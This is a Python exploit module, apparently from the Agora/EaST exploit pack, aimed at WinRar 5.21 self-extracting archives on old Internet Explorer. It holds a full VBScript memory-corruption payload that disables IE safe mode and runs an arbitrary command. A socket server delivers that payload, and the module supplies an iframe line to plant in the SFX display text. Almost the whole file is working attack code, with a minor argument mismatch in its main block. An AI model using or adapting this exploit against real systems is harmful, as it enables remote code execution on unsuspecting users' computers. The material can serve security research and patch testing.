#!/usr/bin/env python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution
# immunity debugger !mona egg -t EaST

import sys
import re
import os
import socket

sys.path.append("./core")
sys.path.append("./shellcodes")
from Shellcodes import OSShellcodes
from Sploit import Sploit

INFO={}
INFO['NAME']="ef_winrar_rce"
INFO['DESCRIPTION']="Winrar 5.21 remote command execution"
INFO['VENDOR']="http://www.rarlab.com/"
INFO["CVE Name"]="N/A"
INFO["NOTES"]="""
    Remote command execution
    Tested on win xp sp2 WinRar 5.21
    """
INFO['CHANGELOG']="07 Oct, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["COMMAND"] = "calc.exe"

EXPLOIT_HTML = """<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<head>
</head>
<body>
  
<SCRIPT LANGUAGE="VBScript">
 
function runmumaa() 
On Error Resume Next
set shell=createobject("Shell.Application")
shell.ShellExecute "{command}", "{parameters}", 0
end function
</script>
  
<SCRIPT LANGUAGE="VBScript">
   
dim   aa()
dim   ab()
dim   a0
dim   a1
dim   a2
dim   a3
dim   win9x
dim   intVersion
dim   rnda
dim   funclass
dim   myarray
  
Begin()
  
function Begin()
  On Error Resume Next
  info=Navigator.UserAgent
  
  if(instr(info,"Win64")>0)   then
     exit   function
  end if
  
  if (instr(info,"MSIE")>0)   then 
             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))   
  else
     exit   function  
               
  end if
  
  win9x=0
  
  BeginInit()
  If Create()=True Then
     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)
  
     if(intVersion<4) then
         document.write("<br> IE")
         document.write(intVersion)
         runshellcode()                    
     else  
          setnotsafemode()
     end if
  end if
end function
  
function BeginInit()
   Randomize()
   redim aa(5)
   redim ab(5)
   a0=13+17*rnd(6)
   a3=7+3*rnd(5)
end function
  
function Create()
  On Error Resume Next
  dim i
  Create=False
  For i = 0 To 400
    If Over()=True Then
       Create=True
       Exit For
    End If 
  Next
end function
  
sub testaa()
end sub
  
function mydata()
    On Error Resume Next
     i=testaa
     i=null
     redim  Preserve aa(a2)  
    
     ab(0)=0
     aa(a1)=i
     ab(0)=6.36598737437801E-314
  
     aa(a1+2)=myarray
     ab(2)=1.74088534731324E-310  
     mydata=aa(a1)
     redim  Preserve aa(a0)  
end function 
  
  
function setnotsafemode()
    On Error Resume Next
    i=mydata()  
    i=rum(i+8)
    i=rum(i+16)
    j=rum(i+&h134)  
    for k=0 to &h60 step 4
        j=rum(i+&h120+k)
        if(j=14) then
              j=0          
              redim  Preserve aa(a2)             
     aa(a1+2)(i+&h11c+k)=ab(4)
              redim  Preserve aa(a0)  
  
     j=0 
              j=rum(i+&h120+k)   
           
               Exit for
           end if
  
    next 
    ab(2)=1.69759663316747E-313
    runmumaa() 
end function
  
function Over()
    On Error Resume Next
    dim type1,type2,type3
    Over=False
    a0=a0+a3
    a1=a0+2
    a2=a0+&h8000000
    
    redim  Preserve aa(a0) 
    redim   ab(a0)     
    
    redim  Preserve aa(a2)
    
    type1=1
    ab(0)=1.123456789012345678901234567890
    aa(a0)=10
            
    If(IsObject(aa(a1-1)) = False) Then
       if(intVersion<4) then
           mem=cint(a0+1)*16             
           j=vartype(aa(a1-1))
           if((j=mem+4) or (j*8=mem+8)) then
              if(vartype(aa(a1-1))<>0)  Then    
                 If(IsObject(aa(a1)) = False ) Then             
                   type1=VarType(aa(a1))
                 end if               
              end if
           else
             redim  Preserve aa(a0)
             exit  function
  
           end if 
        else
           if(vartype(aa(a1-1))<>0)  Then    
              If(IsObject(aa(a1)) = False ) Then
                  type1=VarType(aa(a1))
              end if               
            end if
        end if
    end if
                
      
    If(type1=&h2f66) Then         
          Over=True      
    End If  
    If(type1=&hB9AD) Then
          Over=True
          win9x=1
    End If  
  
    redim  Preserve aa(a0)          
          
end function
  
function rum(add) 
    On Error Resume Next
    redim  Preserve aa(a2)  
    
    ab(0)=0   
    aa(a1)=add+4     
    ab(0)=1.69759663316747E-313       
    rum=lenb(aa(a1))  
     
    ab(0)=0
    redim  Preserve aa(a0)
end function
  
</script>
  
</body>
</html>"""


class exploit(Sploit):
    def __init__(self,command="calc.exe",
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.command_exec = command
        self.name = INFO['NAME']
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.command_exec = self.args.get('COMMAND', self.command_exec)
        return

    def run(self):
        self.args()
        ip_server = "0.0.0.0"
        crlf = "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server = (ip_server, 8089)
        s.bind(server)
        self.log("waiting for request")
        command = self.command_exec.split()[0]
        parameters = ''
        for l in self.command_exec.split()[1:]:
            parameters += " "+l
        parameters += " runas"
        print(self.command_exec)
        exploit = EXPLOIT_HTML.format(command=command, parameters=parameters)
        response = "HTTP/1.1 200 OK" + crlf
        response += "Content-Type: text/html" + crlf
        response += "Connection: close" + crlf
        response += "Server: Apache" + crlf
        response += "Content-Length: " + str(len(exploit))
        response += crlf + crlf + exploit + crlf
        back_ip = socket.gethostbyname(socket.gethostname())
        self.log("Insert this code on the 'Text to display into sfx windows'")
        self.log("<iframe src='http://" + back_ip + ":8089/'> </iframe>")
        s.listen(1)
        connection, client_address = s.accept()
        while True:
            try:
                connection.recv(2048)
                self.log("Got request, sending payload")
                connection.send(exploit)
                self.log("exploit send")
                connection.close()
            except:
                pass
        self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
